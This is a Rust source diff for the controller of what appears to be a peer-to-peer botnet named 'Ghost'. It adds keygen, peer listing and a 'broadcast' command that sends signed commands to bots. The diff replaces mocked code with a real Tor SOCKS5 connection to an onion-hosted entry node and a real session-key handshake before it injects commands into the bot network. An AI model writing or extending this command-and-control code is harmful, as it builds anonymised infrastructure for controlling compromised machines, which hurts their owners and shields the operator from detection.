@@ -1,6 +1,9 @@
 use std::path::PathBuf;
 use crate::crypto;
 use crate::network::GhostClient;
+use tokio_tungstenite::MaybeTlsStream;
+use tokio::net::TcpStream;
+use tokio_socks::tcp::Socks5Stream;
 
 pub async fn handle_keygen(output: PathBuf) {
     let pub_key = crypto::generate_key(&output);
@@ -9,7 +12,7 @@ pub async fn handle_keygen(output: PathBuf) {
 }
 
 pub async fn handle_list(bootstrap: String) {
-    let mut client = match GhostClient::connect(&bootstrap).await {
+    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
         Ok(c) => c,
         Err(e) => {
             eprintln!("Failed to connect to Bootstrap: {}", e);
@@ -37,7 +40,7 @@ pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String)
     let key = crypto::load_key(&key_path);
     
     // 1. Connect to Bootstrap to find an entry node
-    let mut client = match GhostClient::connect(&bootstrap).await {
+    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
         Ok(c) => c,
         Err(e) => {
             eprintln!("Conn Error: {}", e);
@@ -59,22 +62,42 @@ pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String)
         return;
     }
     
-    // 2. Pick random Entry Node
+    // 2. Pick Random Entry Node
     use rand::seq::SliceRandom;
     let entry = peers.choose(&mut rand::thread_rng()).unwrap();
     println!("Selected Entry Node: {} ({})", entry.pub_key, entry.onion_address);
     
-    // 3. Connect to Entry Node (Tor)
-    // In this mock, we reuse the client because we haven't implemented switching sockets.
-    // In real code: let mut node_conn = GhostClient::connect(&entry.onion_address).await...
-    // For now, we simulate Injection on the EXISTING connection (if testing locally) OR we warn.
-    println!("Injecting Gossip...");
+    // Disconnect from Bootstrap (Drop client)
+    drop(client);
+    
+    // 3. Connect to Entry Node via Tor SOCKS5
+    let proxy_addr = "127.0.0.1:9050"; // Standard Tor SOCKS port
+    let onion_host = &entry.onion_address;
+    let onion_port = 80; // Standard for our Hidden Service
+    
+    println!("Connecting to Entry Node via Tor Proxy ({}) ...", proxy_addr);
+    let mut node_client = match GhostClient::<Socks5Stream<TcpStream>>::connect_via_tor(onion_host, onion_port, proxy_addr).await {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("Failed to connect to Entry Node via Tor: {}", e);
+            eprintln!("Ensure Tor is running at {} and the Bot is online.", proxy_addr);
+            return;
+        }
+    };
+    
+    println!("Connected! Performing Handshake...");
+    let session_key = match node_client.handshake().await {
+        Ok(k) => k,
+        Err(e) => {
+             eprintln!("Handshake Failed: {}", e);
+             return;
+        }
+    };
+    println!("Handshake Complete. Session Key Derived."); 
     
     let payload = crypto::create_payload(cmd);
-    // Simulating session key (would be derived from Diffie-Hellman with Node)
-    let mock_session_key = vec![0u8; 32]; 
     
-    if let Err(e) = client.inject_command(payload, &key, &mock_session_key).await {
+    if let Err(e) = node_client.inject_command(payload, &key, &session_key).await {
         eprintln!("Injection Failed: {}", e);
     } else {
         println!("Gossip Injected. Disconnecting.");
